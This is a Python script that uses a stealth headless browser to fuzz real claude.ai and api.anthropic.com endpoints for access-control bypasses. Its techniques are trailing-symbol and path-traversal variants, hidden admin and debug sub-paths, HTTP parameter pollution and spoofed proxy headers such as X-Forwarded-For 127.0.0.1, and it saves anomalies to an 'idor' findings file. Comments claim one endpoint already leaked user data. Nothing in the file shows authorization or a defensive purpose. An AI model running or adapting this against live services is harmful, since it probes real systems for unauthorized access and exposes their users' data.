#!/usr/bin/env python3
"""Focused: save findings incrementally, test key endpoints."""
import asyncio, json, os, time
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/anthropic-idor"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []

KEY_ENDPOINTS = [
    # login_methods - leaked user data on hpp-email-array
    {"name": "login-methods", "host": "claude.ai", "method": "GET", "path": "/api/auth/login_methods", "query": {"email": "test@test.com", "source": "claude-ai"}, "body": None},
    # gift_validate - leaked valid:false
    {"name": "gift-validate", "host": "claude.ai", "method": "GET", "path": "/api/billing/gift/validate", "query": {"code": "TEST"}, "body": None},
    # billing endpoints
    {"name": "billing-credits", "host": "claude.ai", "method": "GET", "path": "/api/billing/credits", "query": {}, "body": None},
    {"name": "billing-subscription", "host": "claude.ai", "method": "GET", "path": "/api/billing/subscription", "query": {}, "body": None},
    # account
    {"name": "account-profile", "host": "claude.ai", "method": "GET", "path": "/api/account_profile", "query": {}, "body": None},
    {"name": "organizations", "host": "claude.ai", "method": "GET", "path": "/api/organizations", "query": {}, "body": None},
    {"name": "org-discoverable", "host": "claude.ai", "method": "GET", "path": "/api/organizations/discoverable", "query": {}, "body": None},
    {"name": "referral", "host": "claude.ai", "method": "GET", "path": "/api/referral", "query": {}, "body": None},
    {"name": "referral-code", "host": "claude.ai", "method": "GET", "path": "/api/referral/code", "query": {}, "body": None, "suffix": "/TEST"},
    # auth
    {"name": "send-magic-link", "host": "claude.ai", "method": "POST", "path": "/api/auth/send_magic_link", "query": {}, "body": {"email_address": "test@test.com", "source": "claude", "utc_offset": 0}},
    {"name": "verify-code", "host": "claude.ai", "method": "POST", "path": "/api/auth/verify_code", "query": {}, "body": {"code": "000000", "email_address": "test@test.com"}},
    {"name": "webauthn-challenge", "host": "claude.ai", "method": "GET", "path": "/api/auth/session_reattest/webauthn/challenge", "query": {}, "body": None},
    {"name": "event-logging", "host": "claude.ai", "method": "POST", "path": "/api/event_logging/v2/batch", "query": {}, "body": {"events": [{"event_type": "test", "event_data": {}}]}},
    {"name": "view-counts", "host": "claude.ai", "method": "GET", "path": "/api/published_artifacts/view_counts", "query": {"artifact_uuids": "00000000-0000-0000-0000-000000000000"}, "body": None},
    {"name": "migration", "host": "claude.ai", "method": "GET", "path": "/api/account/migration_eligibility", "query": {}, "body": None},
    {"name": "team-trial", "host": "claude.ai", "method": "GET", "path": "/api/team-trial/exposure-eligible", "query": {}, "body": None},
    {"name": "bootstrap", "host": "claude.ai", "method": "GET", "path": "/edge-api/bootstrap", "query": {}, "body": None},
    {"name": "banners", "host": "claude.ai", "method": "GET", "path": "/api/banners", "query": {}, "body": None},
    # api.anthropic.com
    {"name": "models", "host": "api.anthropic.com", "method": "GET", "path": "/v1/models", "query": {}, "body": None},
    {"name": "me", "host": "api.anthropic.com", "method": "GET", "path": "/v1/me", "query": {}, "body": None},
    {"name": "register", "host": "api.anthropic.com", "method": "POST", "path": "/register", "query": {}, "body": {"client_name": "test", "redirect_uris": ["http://localhost"]}},
    {"name": "token", "host": "api.anthropic.com", "method": "POST", "path": "/token", "query": {}, "body": {}},
    {"name": "authorize", "host": "api.anthropic.com", "method": "POST", "path": "/authorize", "query": {}, "body": {}},
    {"name": "revoke", "host": "api.anthropic.com", "method": "POST", "path": "/revoke", "query": {}, "body": {}},
    {"name": "oauth-metadata", "host": "api.anthropic.com", "method": "GET", "path": "/.well-known/oauth-authorization-server", "query": {}, "body": None},
    {"name": "v1-oauth-token", "host": "api.anthropic.com", "method": "POST", "path": "/v1/oauth/token", "query": {}, "body": {"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": "test", "federation_rule_id": "fdrl_test", "organization_id": "00000000-0000-0000-0000-000000000000"}},
    # Segment
    {"name": "segment-batch", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/batch", "query": {}, "body": {"batch": []}},
    {"name": "segment-identify", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/identify", "query": {}, "body": {}},
    {"name": "segment-track", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/track", "query": {}, "body": {"event": "test"}},
    {"name": "segment-import", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/import", "query": {}, "body": {}},
]

TRAILING_SYMBOLS = [",", ";", ":", "|", "..", "...", "%00", "\\", "../", "..;/", "%0a", "%0d%0a", "?", "!", "@", "#", "$", "%", "^", "*", "(", ")", "[", "]", "{", "}", "<", ">", "~", "+", "-", "_", " ", "%20", "%09"]

async def test_fetch(page, url, method, body=None, extra_headers=None):
    try:
        body_json = json.dumps(body) if body else "null"
        has_body = body is not None
        hdr_js = ""
        if extra_headers:
            for hk, hv in extra_headers.items():
                hdr_js += f"'{hk}': '{hv}', "
        if has_body:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{'Content-Type': 'application/json', {hdr_js}}},
                        body: JSON.stringify({body_json})
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 1000)}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        else:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{{hdr_js}}}
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 1000)}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        return r
    except:
        return {"status": 0, "body": ""}

async def main():
    from cloakbrowser import launch_async
    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    print("🌐 Loading claude.ai...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    total_findings = 0

    for target in KEY_ENDPOINTS:
        name = target["name"]
        host = target["host"]
        method = target["method"]
        path = target["path"]
        suffix = target.get("suffix", "")
        full_path = path + suffix
        query = target.get("query", {})
        body = target.get("body")

        print(f"\n{'='*60}")
        print(f"🎯 {name}: {method} {host}{full_path}")

        # Baseline
        if body:
            url = f"https://{host}{full_path}"
            baseline = await test_fetch(page, url, method, body)
        elif query:
            url = f"https://{host}{full_path}?{urlencode(query, doseq=True)}"
            baseline = await test_fetch(page, url, method)
        else:
            url = f"https://{host}{full_path}"
            baseline = await test_fetch(page, url, method)

        b_status = baseline.get("status", 0)
        print(f"   Baseline: {b_status} | {baseline.get('body', '')[:100]}")

        # Test trailing symbols
        for sym in TRAILING_SYMBOLS:
            bypass_path = full_path + sym
            if query:
                bypass_url = f"https://{host}{bypass_path}?{urlencode(query, doseq=True)}"
            else:
                bypass_url = f"https://{host}{bypass_path}"

            r = await test_fetch(page, bypass_url, method, body)
            status = r.get("status", 0)
            resp_body = r.get("body", "")

            anomaly = False
            if status and status != b_status:
                if b_status >= 400 and status < 400:
                    anomaly = True
                elif status == 500:
                    anomaly = True
                elif status == 405:
                    anomaly = True

            if anomaly:
                print(f"   🔥 trailing-{sym:10s} → {status} | BYPASS {b_status}→{status}")
                if resp_body and len(resp_body) > 10:
                    print(f"      Body: {resp_body[:150]}")
                FINDINGS.append({"target": name, "technique": f"trailing-{sym}", "url": bypass_url, "method": method, "status": status, "body": resp_body[:500], "anomaly": f"BYPASS {b_status}→{status}"})
                total_findings += 1
                # Save incrementally
                with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                    json.dump(FINDINGS, fp, indent=2)

            await asyncio.sleep(0.15)

        # Test path traversal (just one)
        parts = full_path.split("/")
        if len(parts) >= 4:
            modified = parts[:1] + [".."] + parts[2:]
            trav_path = "/".join(modified)
            trav_url = f"https://{host}{trav_path}"
            r = await test_fetch(page, trav_url, method, body)
            status = r.get("status", 0)
            if status != b_status:
                print(f"   🔥 path-traversal   → {status} | BYPASS {b_status}→{status}")
                FINDINGS.append({"target": name, "technique": "path-traversal", "url": trav_url, "method": method, "status": status, "body": r.get("body", "")[:500], "anomaly": f"BYPASS {b_status}→{status}"})
                total_findings += 1
                with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                    json.dump(FINDINGS, fp, indent=2)

        # Test sub-paths
        for sub in ["/details", "/info", "/status", "/metadata", "/data", "/config", "/admin", "/internal", "/debug"]:
            sub_url = f"https://{host}{full_path}{sub}"
            r = await test_fetch(page, sub_url, method, body)
            status = r.get("status", 0)
            if status != b_status and status < 500:
                is_bypass = (b_status >= 400 and status < 400)
                if is_bypass:
                    print(f"   🔥 subpath-{sub[1:]:12s} → {status} | BYPASS {b_status}→{status}")
                    FINDINGS.append({"target": name, "technique": f"subpath-{sub[1:]}", "url": sub_url, "method": method, "status": status, "body": r.get("body", "")[:500], "anomaly": f"BYPASS {b_status}→{status}"})
                    total_findings += 1
                    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                        json.dump(FINDINGS, fp, indent=2)
            await asyncio.sleep(0.15)

        # Test query param pollution
        if query:
            for key in list(query.keys()):
                polluted = dict(query)
                polluted[key] = [query[key], "test"]
                hpp_url = f"https://{host}{full_path}?{urlencode(polluted, doseq=True)}"
                r = await test_fetch(page, hpp_url, method, body)
                status = r.get("status", 0)
                if status != b_status:
                    print(f"   🔥 hpp-{key}-array    → {status} | CHANGE {b_status}→{status}")
                    if r.get("body", ""):
                        print(f"      Body: {r.get('body', '')[:150]}")
                    FINDINGS.append({"target": name, "technique": f"hpp-{key}-array", "url": hpp_url, "method": method, "status": status, "body": r.get("body", "")[:500], "anomaly": f"CHANGE {b_status}→{status}"})
                    total_findings += 1
                    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                        json.dump(FINDINGS, fp, indent=2)
                await asyncio.sleep(0.15)

        # Test proxy headers
        for hdr_name, hdr_val in [("X-Original-URL", full_path), ("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-Host", "localhost"), ("X-Rewrite-URL", full_path)]:
            proxy_url = f"https://{host}{full_path}"
            r = await test_fetch(page, proxy_url, method, body, {hdr_name: hdr_val})
            status = r.get("status", 0)
            if status != b_status and (b_status >= 400 and status < 400):
                print(f"   🔥 proxy-{hdr_name:20s} → {status} | BYPASS {b_status}→{status}")
                FINDINGS.append({"target": name, "technique": f"proxy-{hdr_name}", "url": proxy_url, "method": method, "status": status, "body": r.get("body", "")[:500], "anomaly": f"BYPASS {b_status}→{status}"})
                total_findings += 1
                with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                    json.dump(FINDINGS, fp, indent=2)
            await asyncio.sleep(0.15)

    # Final save
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)

    print(f"\n{'='*60}")
    print(f"📊 TOTAL: {total_findings} anomalies")
    print(f"{'='*60}")
    for f in FINDINGS:
        print(f"   🔥 [{f['target']}] {f['technique']:30s} → {f['status']} | {f['anomaly']}")
        if f.get("body") and len(f["body"]) > 20:
            print(f"      Body: {f['body'][:120]}")

    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
